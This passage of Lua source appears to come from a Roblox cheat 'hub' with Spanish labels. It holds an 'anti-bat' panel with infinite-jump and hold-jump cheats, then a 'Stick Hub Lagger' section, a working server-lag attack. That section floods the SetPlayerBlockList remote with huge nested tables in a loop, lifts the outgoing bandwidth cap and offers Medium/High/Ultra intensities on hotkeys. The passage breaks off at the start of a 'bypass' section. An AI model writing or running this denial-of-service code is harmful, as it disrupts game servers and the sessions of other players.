    local function makeSwitchRow(order, labelText)
        local row = Instance.new("Frame")
        row.LayoutOrder = order
        row.BackgroundColor3 = CARD
        row.BackgroundTransparency = 0.25
        row.Size = UDim2.new(1, 0, 0, 36)
        row.BorderSizePixel = 0
        row.Parent = content
        Instance.new("UICorner", row).CornerRadius = UDim.new(0, 12)
        local st = Instance.new("UIStroke", row)
        st.Color = Color3.fromRGB(255, 130, 40)
        st.Thickness = 1
        st.Transparency = 0.55

        local lbl = Instance.new("TextLabel")
        lbl.BackgroundTransparency = 1
        lbl.Position = UDim2.new(0, 12, 0, 0)
        lbl.Size = UDim2.new(0.55, 0, 1, 0)
        lbl.Font = Enum.Font.GothamBold
        lbl.Text = labelText
        lbl.TextColor3 = ORANGE_LT
        lbl.TextSize = 12
        lbl.TextXAlignment = Enum.TextXAlignment.Left
        lbl.Parent = row

        -- track
        local track = Instance.new("Frame")
        track.Name = "Track"
        track.Size = UDim2.new(0, 52, 0, 24)
        track.Position = UDim2.new(1, -64, 0.5, -12)
        track.BackgroundColor3 = Color3.fromRGB(30, 28, 40)
        track.BorderSizePixel = 0
        track.Parent = row
        Instance.new("UICorner", track).CornerRadius = UDim.new(1, 0)
        local trackSt = Instance.new("UIStroke", track)
        trackSt.Color = Color3.fromRGB(80, 70, 90)
        trackSt.Thickness = 1

        local knob = Instance.new("Frame")
        knob.Name = "Knob"
        knob.Size = UDim2.new(0, 20, 0, 20)
        knob.Position = UDim2.new(0, 2, 0.5, -10)
        knob.BackgroundColor3 = Color3.fromRGB(200, 190, 210)
        knob.BorderSizePixel = 0
        knob.Parent = track
        Instance.new("UICorner", knob).CornerRadius = UDim.new(1, 0)

        local stateLbl = Instance.new("TextLabel")
        stateLbl.Name = "State"
        stateLbl.BackgroundTransparency = 1
        stateLbl.Size = UDim2.new(1, 0, 1, 0)
        stateLbl.Font = Enum.Font.GothamBold
        stateLbl.Text = "OFF"
        stateLbl.TextSize = 9
        stateLbl.TextColor3 = Color3.fromRGB(160, 150, 170)
        stateLbl.Parent = track

        local click = Instance.new("TextButton")
        click.BackgroundTransparency = 1
        click.Size = UDim2.new(1, 0, 1, 0)
        click.Text = ""
        click.Parent = row
        return click, track, knob, trackSt, stateLbl
    end

    local function setSwitchVisual(track, knob, trackSt, stateLbl, on)
        TweenService:Create(knob, TweenInfo.new(0.22, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            Position = on and UDim2.new(1, -22, 0.5, -10) or UDim2.new(0, 2, 0.5, -10),
            BackgroundColor3 = on and GREEN_ON or Color3.fromRGB(200, 190, 210),
        }):Play()
        TweenService:Create(track, TweenInfo.new(0.22), {
            BackgroundColor3 = on and Color3.fromRGB(20, 50, 35) or Color3.fromRGB(30, 28, 40),
        }):Play()
        TweenService:Create(trackSt, TweenInfo.new(0.22), {
            Color = on and GREEN_ON or Color3.fromRGB(80, 70, 90),
        }):Play()
        stateLbl.Text = on and "ON" or "OFF"
        stateLbl.TextColor3 = on and GREEN_ON or Color3.fromRGB(160, 150, 170)
    end

    local infClick, infTrack, infKnob, infTrackSt, infState = makeSwitchRow(3, "Inf Jump")
    local holdClick, holdTrack, holdKnob, holdTrackSt, holdState = makeSwitchRow(4, "Hold Jump")

    -- KEYBIND
    local keyRow = Instance.new("Frame")
    keyRow.LayoutOrder = 5
    keyRow.BackgroundColor3 = CARD
    keyRow.BackgroundTransparency = 0.25
    keyRow.Size = UDim2.new(1, 0, 0, 36)
    keyRow.BorderSizePixel = 0
    keyRow.Parent = content
    Instance.new("UICorner", keyRow).CornerRadius = UDim.new(0, 12)
    local keySt = Instance.new("UIStroke", keyRow)
    keySt.Color = Color3.fromRGB(255, 130, 40)
    keySt.Thickness = 1
    keySt.Transparency = 0.55
    local keyLbl = Instance.new("TextLabel")
    keyLbl.BackgroundTransparency = 1
    keyLbl.Position = UDim2.new(0, 12, 0, 0)
    keyLbl.Size = UDim2.new(0.5, 0, 1, 0)
    keyLbl.Font = Enum.Font.GothamBold
    keyLbl.Text = "Tecla"
    keyLbl.TextColor3 = ORANGE_LT
    keyLbl.TextSize = 12
    keyLbl.TextXAlignment = Enum.TextXAlignment.Left
    keyLbl.Parent = keyRow
    local keyBtn = Instance.new("TextButton")
    keyBtn.Size = UDim2.new(0, 78, 0, 24)
    keyBtn.Position = UDim2.new(1, -90, 0.5, -12)
    keyBtn.BackgroundColor3 = Color3.fromRGB(30, 24, 40)
    keyBtn.Text = "[ " .. (M.antiBatKeybind and M.antiBatKeybind.Name or "K") .. " ]"
    keyBtn.TextColor3 = ORANGE
    keyBtn.Font = Enum.Font.GothamBlack
    keyBtn.TextSize = 11
    keyBtn.BorderSizePixel = 0
    keyBtn.AutoButtonColor = false
    keyBtn.Parent = keyRow
    Instance.new("UICorner", keyBtn).CornerRadius = UDim.new(0, 8)
    local keyBtnSt = Instance.new("UIStroke", keyBtn)
    keyBtnSt.Color = ORANGE
    keyBtnSt.Thickness = 1
    keyBtnSt.Transparency = 0.3

    local foot = Instance.new("TextLabel")
    foot.LayoutOrder = 6
    foot.BackgroundTransparency = 1
    foot.Size = UDim2.new(1, 0, 0, 14)
    foot.Font = Enum.Font.Code
    foot.Text = "stick duels"
    foot.TextColor3 = Color3.fromRGB(120, 100, 90)
    foot.TextSize = 10
    foot.Parent = content

    local function updateAntiBatStatus()
        if M.antiBatEnabled then
            actBtn.Text = "●  DESACTIVAR"
            actBtn.TextColor3 = Color3.fromRGB(15, 25, 18)
            actBtn.TextSize = 14
            actStroke.Color = GREEN_ON
            actStroke.Thickness = 2
            actStroke.Transparency = 0
            statusLbl.Text = "STATUS  ·  ON"
            statusLbl.TextColor3 = GREEN_ON
            statusDot.BackgroundColor3 = GREEN_ON
            actRow.BackgroundColor3 = Color3.fromRGB(40, 90, 55)
            actGrad.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(100, 255, 150)),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(60, 230, 120)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(40, 190, 90)),
            })
            mainStroke.Transparency = 0
            mainStroke.Color = GREEN_ON
            mainStroke.Thickness = 2.2
        else
            actBtn.Text = "○  ACTIVAR"
            actBtn.TextColor3 = Color3.fromRGB(255, 220, 170)
            actBtn.TextSize = 14
            actStroke.Color = ORANGE
            actStroke.Thickness = 2
            actStroke.Transparency = 0.1
            statusLbl.Text = "STATUS  ·  OFF"
            statusLbl.TextColor3 = Color3.fromRGB(255, 110, 130)
            statusDot.BackgroundColor3 = Color3.fromRGB(255, 70, 100)
            actRow.BackgroundColor3 = Color3.fromRGB(45, 28, 12)
            actGrad.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 140, 40)),
                ColorSequenceKeypoint.new(0.5, Color3.fromRGB(200, 90, 20)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(90, 40, 10)),
            })
            mainStroke.Transparency = 0.2
            mainStroke.Color = ORANGE
            mainStroke.Thickness = 2
        end
        keyBtn.Text = M._antiBatWaitingKey and "[ ... ]" or ("[ " .. (M.antiBatKeybind and M.antiBatKeybind.Name or "K") .. " ]")
    end

    local function setAntiBatOn(on)
        M.antiBatEnabled = on and true or false
        if M.antiBatEnabled then
            M.startAntiBatCore()
        else
            M.stopAntiBatCore()
        end
        updateAntiBatStatus()
        if M.setAntiBatVisual then M.setAntiBatVisual(M.antiBatEnabled) end
        pcall(saveCherryConfig)
    end

    actBtn.MouseButton1Click:Connect(function()
        setAntiBatOn(not M.antiBatEnabled)
    end)

    infClick.MouseButton1Click:Connect(function()
        M.antiBatPanelInfJump = not M.antiBatPanelInfJump
        M.infJumpEnabled = M.antiBatPanelInfJump
        if M.infJumpEnabled then
            if M.startManualInfJumpLoop then M.startManualInfJumpLoop() end
        else
            if M.stopManualInfJumpLoop then M.stopManualInfJumpLoop() end
        end
        setSwitchVisual(infTrack, infKnob, infTrackSt, infState, M.antiBatPanelInfJump)
        if M.setInfJumpVisual then M.setInfJumpVisual(M.infJumpEnabled) end
        pcall(saveCherryConfig)
    end)

    holdClick.MouseButton1Click:Connect(function()
        M.antiBatPanelHoldJump = not M.antiBatPanelHoldJump
        if M.setHoldJump then
            M.setHoldJump(M.antiBatPanelHoldJump)
        else
            M.holdJumpEnabled = M.antiBatPanelHoldJump
        end
        setSwitchVisual(holdTrack, holdKnob, holdTrackSt, holdState, M.antiBatPanelHoldJump)
        if M.setHoldJumpVisual then M.setHoldJumpVisual(M.holdJumpEnabled) end
        pcall(saveCherryConfig)
    end)

    keyBtn.MouseButton1Click:Connect(function()
        if M._antiBatWaitingKey then return end
        M._antiBatWaitingKey = true
        updateAntiBatStatus()
    end)

    minBtn.MouseButton1Click:Connect(function()
        isMinimized = not isMinimized
        local h = isMinimized and MINI_H or PH
        TweenService:Create(frame, TweenInfo.new(0.28, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {
            Size = UDim2.new(0, PW, 0, h)
        }):Play()
        content.Visible = not isMinimized
        minBtn.Text = isMinimized and "+" or "−"
    end)

    do
        local dragging, dragStart, startPos
        header.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                dragging = true
                dragStart = input.Position
                startPos = frame.Position
                input.Changed:Connect(function()
                    if input.UserInputState == Enum.UserInputState.End then dragging = false end
                end)
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                local d = input.Position - dragStart
                frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + d.X, startPos.Y.Scale, startPos.Y.Offset + d.Y)
            end
        end)
    end

    M._antiBatKeyConn = UIS.InputBegan:Connect(function(inp, gp)
        if gp then return end
        if M._antiBatWaitingKey and inp.UserInputType == Enum.UserInputType.Keyboard then
            if inp.KeyCode ~= Enum.KeyCode.Unknown then
                M.antiBatKeybind = inp.KeyCode
                M._antiBatWaitingKey = false
                updateAntiBatStatus()
                pcall(saveCherryConfig)
            end
            return
        end
        if not M._antiBatWaitingKey and inp.UserInputType == Enum.UserInputType.Keyboard then
            if inp.KeyCode == (M.antiBatKeybind or Enum.KeyCode.K) then
                setAntiBatOn(not M.antiBatEnabled)
            end
        end
    end)

    M._antiBatCharConn = player.CharacterAdded:Connect(function()
        if M.antiBatEnabled then
            task.wait(0.35)
            M.startAntiBatCore()
        end
    end)

    M.antiBatPanelInfJump = M.infJumpEnabled == true
    M.antiBatPanelHoldJump = M.holdJumpEnabled == true
    setSwitchVisual(infTrack, infKnob, infTrackSt, infState, M.antiBatPanelInfJump)
    setSwitchVisual(holdTrack, holdKnob, holdTrackSt, holdState, M.antiBatPanelHoldJump)

    setAntiBatOn(true)
end

function M.setAntiBat(on)
    on = on and true or false
    if on then
        M.buildAntiBatUI()
    else
        M.destroyAntiBatUI()
        M.antiBatEnabled = false
        if M.setAntiBatVisual then M.setAntiBatVisual(false) end
    end
end

-- ============================================================
-- ============================================================
-- ============================================================
-- ============================================================
-- STICK HUB LAGGER (panel completo Medium / High / Ultra)
-- ============================================================
M.laggerGui = nil
M.laggerBombActive = false
M.laggerIntensity = "Medium"
M.laggerKeybinds = {
    Medium = Enum.KeyCode.V,
    High = Enum.KeyCode.L,
    Ultra = Enum.KeyCode.U,
}
M._laggerThread = nil
M._laggerKeyConn = nil
M._laggerSettingKey = false
M._laggerSettingIntensity = "Medium"

M.LAGGER_INTENSITY = {
    Medium = {
        TableIncrease = 265,
        Tries = 1,
        LoopWaitTime = 0.85,
        Label = "Medium",
        Color = Color3.fromRGB(255, 180, 50),
        IsUltra = false,
        Velocidad = "38 18",
    },
    High = {
        TableIncrease = 1.5,
        Tries = 1,
        LoopWaitTime = 0.155,
        Label = "High",
        Color = Color3.fromRGB(255, 120, 20),
        IsUltra = false,
        Velocidad = "41 21",
    },
    Ultra = {
        Label = "Ultra",
        Color = Color3.fromRGB(255, 80, 0),
        IsUltra = true,
        LoopWaitTime = 0.18,
        Velocidad = "45 25",
    },
}

local function M_laggerResolveRemote(path)
    local obj = game
    local cleaned = path:gsub("^game%.", "")
    for segment in cleaned:gmatch("[^%.]+") do
        if obj then obj = obj[segment] else return nil end
    end
    return obj
end

local function M_laggerGetMax(val, isMain)
    if isMain then return 499999 / (val + 2) else return 58500 / (val + 2) end
end

local function M_laggerBombNormal(tableincrease, tries, isMain)
    local maintable = {}
    local spammedtable = {}
    table.insert(spammedtable, {})
    local z = spammedtable[1]
    for _ = 1, tableincrease do
        local tableins = {}
        table.insert(z, tableins)
        z = tableins
    end
    local maximum = M_laggerGetMax(tableincrease, isMain) or 9999999
    for i = 1, maximum do
        table.insert(maintable, spammedtable)
        if i % 5000 == 0 then task.wait() end
    end
    local remote = M_laggerResolveRemote("RobloxReplicatedStorage.SetPlayerBlockList")
    if remote then
        for _ = 1, tries do
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(maintable)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(maintable)
                end
            end)
        end
    end
end

local function M_laggerBombUltra()
    local main, spam = {}, {{}}
    local z = spam[1]
    for _ = 1, 25 do
        local tbl = {}
        table.insert(z, tbl)
        z = tbl
    end
    for _ = 1, 4000 do
        table.insert(main, spam)
    end
    pcall(function()
        game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main)
    end)
end

function M.stopLaggerBomb()
    M.laggerBombActive = false
    if M._laggerThread then
        pcall(function() task.cancel(M._laggerThread) end)
        M._laggerThread = nil
    end
end

function M.startLaggerBomb()
    M.stopLaggerBomb()
    M.laggerBombActive = true
    local intensity = M.laggerIntensity or "Medium"
    local config = M.LAGGER_INTENSITY[intensity]
    if not config then return end
    if config.IsUltra then
        M._laggerThread = task.spawn(function()
            while M.laggerBombActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end)
                task.spawn(function() M_laggerBombUltra() end)
                task.wait(config.LoopWaitTime)
            end
        end)
    else
        M._laggerThread = task.spawn(function()
            while M.laggerBombActive do
                pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge) end)
                local isMain = (intensity == "Medium")
                task.spawn(function() M_laggerBombNormal(config.TableIncrease, config.Tries, isMain) end)
                task.wait(config.LoopWaitTime)
            end
        end)
    end
end

function M.destroyLaggerUI()
    M.stopLaggerBomb()
    if M._laggerKeyConn then
        pcall(function() M._laggerKeyConn:Disconnect() end)
        M._laggerKeyConn = nil
    end
    if M.laggerGui then
        pcall(function() M.laggerGui:Destroy() end)
        M.laggerGui = nil
    end
    M._laggerSettingKey = false
end

function M.buildLaggerUI()
    M.destroyLaggerUI()

    local isTouch = UIS.TouchEnabled and not UIS.MouseEnabled
    local uiWidth = isTouch and 200 or 240
    local headerHeight = isTouch and 32 or 38
    local closeBtnSize = isTouch and 16 or 18
    local contentHeight = 30 + 20 + 22 + 6
    local uiHeight = headerHeight + contentHeight + 4

    local gui = Instance.new("ScreenGui")
    gui.Name = "StickHubLagger_UI"
    gui.ResetOnSpawn = false
    gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
    pcall(function()
        if gethui then gui.Parent = gethui()
        else gui.Parent = game:GetService("CoreGui") end
    end)
    if not gui.Parent then gui.Parent = player:WaitForChild("PlayerGui") end
    M.laggerGui = gui

    local mainFrame = Instance.new("Frame")
    mainFrame.Name = "MainFrame"
    mainFrame.BackgroundColor3 = Color3.fromRGB(200, 80, 0)
    mainFrame.BorderSizePixel = 0
    mainFrame.Size = UDim2.new(0, uiWidth, 0, uiHeight)
    mainFrame.Position = UDim2.new(0.5, -uiWidth/2, 0.55, -uiHeight/2)
    mainFrame.ClipsDescendants = false
    mainFrame.Parent = gui
    do
        local g = Instance.new("UIGradient", mainFrame)
        g.Color = ColorSequence.new({
            ColorSequenceKeypoint.new(0, Color3.fromRGB(180, 70, 0)),
            ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 140, 20)),
            ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 70, 0)),
        })
    end
    local mainStroke = Instance.new("UIStroke", mainFrame)
    mainStroke.Color = Color3.fromRGB(255, 200, 50)
    mainStroke.Thickness = 2
    mainStroke.Transparency = 0.2
    Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0, 10)

    local header = Instance.new("Frame")
    header.Name = "Header"
    header.BackgroundTransparency = 1
    header.Size = UDim2.new(1, 0, 0, headerHeight)
    header.Parent = mainFrame

    local titleShadow = Instance.new("TextLabel")
    titleShadow.BackgroundTransparency = 1
    titleShadow.Position = UDim2.new(0, 10, 0, 6)
    titleShadow.Size = UDim2.new(0, uiWidth - 60, 0, 24)
    titleShadow.Font = Enum.Font.GothamBold
    titleShadow.Text = "Stick Hub Lagger"
    titleShadow.TextColor3 = Color3.fromRGB(0, 0, 0)
    titleShadow.TextSize = isTouch and 14 or 18
    titleShadow.TextXAlignment = Enum.TextXAlignment.Left
    titleShadow.TextTransparency = 0.6
    titleShadow.Parent = header

    local titleLabel = Instance.new("TextLabel")
    titleLabel.BackgroundTransparency = 1
    titleLabel.Position = UDim2.new(0, 8, 0, 4)
    titleLabel.Size = UDim2.new(0, uiWidth - 60, 0, 24)
    titleLabel.Font = Enum.Font.GothamBold
    titleLabel.Text = "Stick Hub Lagger"
    titleLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
    titleLabel.TextSize = isTouch and 14 or 18
    titleLabel.TextXAlignment = Enum.TextXAlignment.Left
    titleLabel.Parent = header

    local toggleMinBtn = Instance.new("TextButton")
    toggleMinBtn.Size = UDim2.new(0, closeBtnSize, 0, closeBtnSize)
    toggleMinBtn.Position = UDim2.new(1, -closeBtnSize - 8, 0, 6)
    toggleMinBtn.BackgroundColor3 = Color3.fromRGB(80, 30, 0)
    toggleMinBtn.Text = "−"
    toggleMinBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggleMinBtn.Font = Enum.Font.GothamBold
    toggleMinBtn.TextSize = isTouch and 12 or 14
    toggleMinBtn.AutoButtonColor = false
    toggleMinBtn.Parent = header
    Instance.new("UICorner", toggleMinBtn).CornerRadius = UDim.new(1, 0)

    local contentContainer = Instance.new("Frame")
    contentContainer.Name = "Content"
    contentContainer.BackgroundTransparency = 1
    contentContainer.Size = UDim2.new(1, -12, 1, -headerHeight - 2)
    contentContainer.Position = UDim2.new(0, 6, 0, headerHeight + 1)
    contentContainer.Parent = mainFrame

    local row = Instance.new("Frame")
    row.BackgroundTransparency = 1
    row.Size = UDim2.new(1, 0, 0, 30)
    row.Parent = contentContainer

    local statusLight = Instance.new("Frame")
    statusLight.Size = UDim2.new(0, 8, 0, 8)
    statusLight.Position = UDim2.new(0, 4, 0.5, -4)
    statusLight.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
    statusLight.ZIndex = 5
    statusLight.Parent = row
    Instance.new("UICorner", statusLight).CornerRadius = UDim.new(1, 0)

    local toggleBtn = Instance.new("TextButton")
    toggleBtn.Size = UDim2.new(0, 64, 0, 24)
    toggleBtn.Position = UDim2.new(0, 16, 0.5, -12)
    toggleBtn.BackgroundColor3 = Color3.fromRGB(80, 30, 0)
    toggleBtn.Text = "Activar"
    toggleBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    toggleBtn.Font = Enum.Font.GothamBold
    toggleBtn.TextSize = 11
    toggleBtn.AutoButtonColor = false
    toggleBtn.Parent = row
    Instance.new("UICorner", toggleBtn).CornerRadius = UDim.new(0, 4)

    local intensityFrame = Instance.new("Frame")
    intensityFrame.Size = UDim2.new(0, 82, 0, 24)
    intensityFrame.Position = UDim2.new(0.5, 4, 0.5, -12)
    intensityFrame.BackgroundColor3 = Color3.fromRGB(80, 30, 0)
    intensityFrame.BackgroundTransparency = 0.2
    intensityFrame.ZIndex = 8
    intensityFrame.Parent = row
    Instance.new("UICorner", intensityFrame).CornerRadius = UDim.new(0, 4)
    local intensityStroke = Instance.new("UIStroke", intensityFrame)
    intensityStroke.Color = Color3.fromRGB(255, 200, 50)
    intensityStroke.Thickness = 1.5

    local intensityBtn = Instance.new("TextButton")
    intensityBtn.Size = UDim2.new(1, -18, 1, 0)
    intensityBtn.Position = UDim2.new(0, 2, 0, 0)
    intensityBtn.BackgroundTransparency = 1
    intensityBtn.Text = M.LAGGER_INTENSITY[M.laggerIntensity].Label
    intensityBtn.TextColor3 = M.LAGGER_INTENSITY[M.laggerIntensity].Color
    intensityBtn.Font = Enum.Font.GothamBold
    intensityBtn.TextSize = 12
    intensityBtn.ZIndex = 9
    intensityBtn.Parent = intensityFrame

    local arrowLabel = Instance.new("TextLabel")
    arrowLabel.Size = UDim2.new(0, 14, 1, 0)
    arrowLabel.Position = UDim2.new(1, -14, 0, 0)
    arrowLabel.BackgroundTransparency = 1
    arrowLabel.Text = "▲"
    arrowLabel.TextColor3 = Color3.fromRGB(255, 200, 50)
    arrowLabel.Font = Enum.Font.Gotham
    arrowLabel.TextSize = 10
    arrowLabel.ZIndex = 10
    arrowLabel.Parent = intensityFrame

    local dropMenu = Instance.new("Frame")
    dropMenu.Size = UDim2.new(0, 82, 0, 40)
    dropMenu.Position = UDim2.new(0.5, 4, 0, -44)
    dropMenu.BackgroundColor3 = Color3.fromRGB(40, 15, 0)
    dropMenu.BackgroundTransparency = 0.1
    dropMenu.ZIndex = 20
    dropMenu.Visible = false
    dropMenu.Parent = row
    Instance.new("UICorner", dropMenu).CornerRadius = UDim.new(0, 4)
    local dropMenuStroke = Instance.new("UIStroke", dropMenu)
    dropMenuStroke.Color = Color3.fromRGB(255, 200, 50)
    dropMenuStroke.Thickness = 1
    local dropLayout = Instance.new("UIListLayout", dropMenu)
    dropLayout.Padding = UDim.new(0, 2)

    local keyRow = Instance.new("Frame")
    keyRow.BackgroundTransparency = 1
    keyRow.Size = UDim2.new(1, 0, 0, 20)
    keyRow.Position = UDim2.new(0, 0, 0, 32)
    keyRow.Parent = contentContainer

    local keyLabel = Instance.new("TextLabel")
    keyLabel.Size = UDim2.new(0, 28, 1, 0)
    keyLabel.Position = UDim2.new(0, 4, 0, 0)
    keyLabel.BackgroundTransparency = 1
    keyLabel.Text = "KEY"
    keyLabel.TextColor3 = Color3.fromRGB(255, 220, 150)
    keyLabel.TextSize = 10
    keyLabel.Font = Enum.Font.GothamBold
    keyLabel.TextXAlignment = Enum.TextXAlignment.Left
    keyLabel.Parent = keyRow

    local keybindBtn = Instance.new("TextButton")
    keybindBtn.Size = UDim2.new(0, 45, 0, 16)
    keybindBtn.Position = UDim2.new(0, 34, 0.5, -8)
    keybindBtn.BackgroundColor3 = Color3.fromRGB(80, 30, 0)
    keybindBtn.BackgroundTransparency = 0.2
    keybindBtn.Text = M.laggerKeybinds[M.laggerIntensity].Name
    keybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    keybindBtn.Font = Enum.Font.GothamBold
    keybindBtn.TextSize = 10
    keybindBtn.Parent = keyRow
    Instance.new("UICorner", keybindBtn).CornerRadius = UDim.new(0, 3)
    local keyStroke = Instance.new("UIStroke", keybindBtn)
    keyStroke.Color = Color3.fromRGB(255, 200, 50)
    keyStroke.Thickness = 1

    local keyHint = Instance.new("TextLabel")
    keyHint.Size = UDim2.new(0, 40, 1, 0)
    keyHint.Position = UDim2.new(0, 82, 0, 0)
    keyHint.BackgroundTransparency = 1
    keyHint.Text = "click"
    keyHint.TextColor3 = Color3.fromRGB(255, 180, 100)
    keyHint.TextSize = 9
    keyHint.Font = Enum.Font.Gotham
    keyHint.TextXAlignment = Enum.TextXAlignment.Left
    keyHint.Parent = keyRow

    local velocidadRow = Instance.new("Frame")
    velocidadRow.BackgroundTransparency = 1
    velocidadRow.Size = UDim2.new(1, 0, 0, 22)
    velocidadRow.Position = UDim2.new(0, 0, 0, 54)
    velocidadRow.Parent = contentContainer

    local separator = Instance.new("Frame")
    separator.Size = UDim2.new(1, -10, 0, 1)
    separator.Position = UDim2.new(0, 5, 0, 0)
    separator.BackgroundColor3 = Color3.fromRGB(255, 200, 50)
    separator.BackgroundTransparency = 0.3
    separator.Parent = velocidadRow

    local velocidadLabel = Instance.new("TextLabel")
    velocidadLabel.Size = UDim2.new(1, -10, 0, 18)
    velocidadLabel.Position = UDim2.new(0, 5, 0, 3)
    velocidadLabel.BackgroundTransparency = 1
    velocidadLabel.Text = "⚡ Velocidad recomendada: " .. M.LAGGER_INTENSITY[M.laggerIntensity].Velocidad
    velocidadLabel.TextColor3 = Color3.fromRGB(255, 220, 50)
    velocidadLabel.TextSize = isTouch and 10 or 12
    velocidadLabel.Font = Enum.Font.GothamBold
    velocidadLabel.TextXAlignment = Enum.TextXAlignment.Center
    velocidadLabel.Parent = velocidadRow

    local function updateUI()
        if M.laggerBombActive then
            toggleBtn.Text = "Desactivar"
            toggleBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
            statusLight.BackgroundColor3 = Color3.fromRGB(255, 200, 0)
        else
            toggleBtn.Text = "Activar"
            toggleBtn.BackgroundColor3 = Color3.fromRGB(80, 30, 0)
            statusLight.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
        end
        local cfg = M.LAGGER_INTENSITY[M.laggerIntensity]
        intensityBtn.Text = cfg.Label
        intensityBtn.TextColor3 = cfg.Color
        keybindBtn.Text = M._laggerSettingKey and "..." or M.laggerKeybinds[M.laggerIntensity].Name
        velocidadLabel.Text = "⚡ Velocidad recomendada: " .. cfg.Velocidad
    end

    local function toggleLaggerBomb()
        if M.laggerBombActive then
            M.stopLaggerBomb()
        else
            M.startLaggerBomb()
        end
        updateUI()
    end

    local function setIntensity(newIntensity)
        if M.laggerIntensity == newIntensity then return end
        M.laggerIntensity = newIntensity
        if M.laggerBombActive then
            M.startLaggerBomb()
        end
        updateUI()
        pcall(saveCherryConfig)
    end

    local dropOpen = false
    local function closeDropdown()
        dropOpen = false
        dropMenu.Visible = false
        arrowLabel.Text = "▲"
    end

    local function updateDropdown()
        for _, child in ipairs(dropMenu:GetChildren()) do
            if child:IsA("TextButton") then child:Destroy() end
        end
        local opts = {}
        for _, name in ipairs({"Medium", "High", "Ultra"}) do
            if name ~= M.laggerIntensity then table.insert(opts, name) end
        end
        dropMenu.Size = UDim2.new(0, 82, 0, #opts * 20 + 4)
        dropMenu.Position = UDim2.new(0.5, 4, 0, -(#opts * 20 + 6))
        for _, intensity in ipairs(opts) do
            local opt = Instance.new("TextButton")
            opt.Size = UDim2.new(1, -4, 0, 18)
            opt.BackgroundColor3 = Color3.fromRGB(80, 30, 0)
            opt.BackgroundTransparency = 0.2
            opt.Text = M.LAGGER_INTENSITY[intensity].Label
            opt.TextColor3 = M.LAGGER_INTENSITY[intensity].Color
            opt.Font = Enum.Font.GothamBold
            opt.TextSize = 11
            opt.ZIndex = 21
            opt.Parent = dropMenu
            Instance.new("UICorner", opt).CornerRadius = UDim.new(0, 3)
            opt.MouseButton1Click:Connect(function()
                setIntensity(intensity)
                closeDropdown()
            end)
        end
    end

    toggleBtn.MouseButton1Click:Connect(toggleLaggerBomb)
    intensityBtn.MouseButton1Click:Connect(function()
        dropOpen = not dropOpen
        if dropOpen then
            updateDropdown()
            arrowLabel.Text = "▼"
            dropMenu.Visible = true
        else
            closeDropdown()
        end
    end)

    keybindBtn.MouseButton1Click:Connect(function()
        if M._laggerSettingKey then return end
        M._laggerSettingKey = true
        M._laggerSettingIntensity = M.laggerIntensity
        keybindBtn.Text = "..."
        keybindBtn.TextColor3 = Color3.fromRGB(255, 230, 100)
    end)

    M._laggerKeyConn = UIS.InputBegan:Connect(function(input, gpe)
        if gpe then return end
        if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
        if M._laggerSettingKey then
            if input.KeyCode ~= Enum.KeyCode.Unknown then
                M.laggerKeybinds[M._laggerSettingIntensity] = input.KeyCode
                M._laggerSettingKey = false
                keybindBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
                updateUI()
                pcall(saveCherryConfig)
            end
            return
        end
        if input.KeyCode == M.laggerKeybinds[M.laggerIntensity] then
            toggleLaggerBomb()
        end
    end)

    local minimized = false
    toggleMinBtn.MouseButton1Click:Connect(function()
        minimized = not minimized
        if minimized then
            toggleMinBtn.Text = "+"
            contentContainer.Visible = false
            mainFrame.Size = UDim2.new(0, uiWidth, 0, headerHeight + 4)
        else
            toggleMinBtn.Text = "−"
            contentContainer.Visible = true
            mainFrame.Size = UDim2.new(0, uiWidth, 0, uiHeight)
        end
    end)

    do
        local isDragging, dragStart, startPosition
        header.InputBegan:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                isDragging = true
                dragStart = input.Position
                startPosition = mainFrame.Position
            end
        end)
        UIS.InputChanged:Connect(function(input)
            if isDragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
                local delta = input.Position - dragStart
                mainFrame.Position = UDim2.new(
                    startPosition.X.Scale, startPosition.X.Offset + delta.X,
                    startPosition.Y.Scale, startPosition.Y.Offset + delta.Y
                )
            end
        end)
        header.InputEnded:Connect(function(input)
            if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
                isDragging = false
            end
        end)
    end

    updateUI()
end

function M.setLaggerPanel(on)
    on = on and true or false
    M.laggerPanelEnabled = on
    if on then
        M.buildLaggerUI()
    else
        M.destroyLaggerUI()
        M.laggerPanelEnabled = false
    end
    if M.setLaggerPanelVisual then M.setLaggerPanelVisual(M.laggerPanelEnabled) end
    pcall(saveCherryConfig)
end

-- ============================================================
-- STICK BYPASS (panel PC / Mobile + power + keybind)
-- ============================================================
M.bypassGui = nil
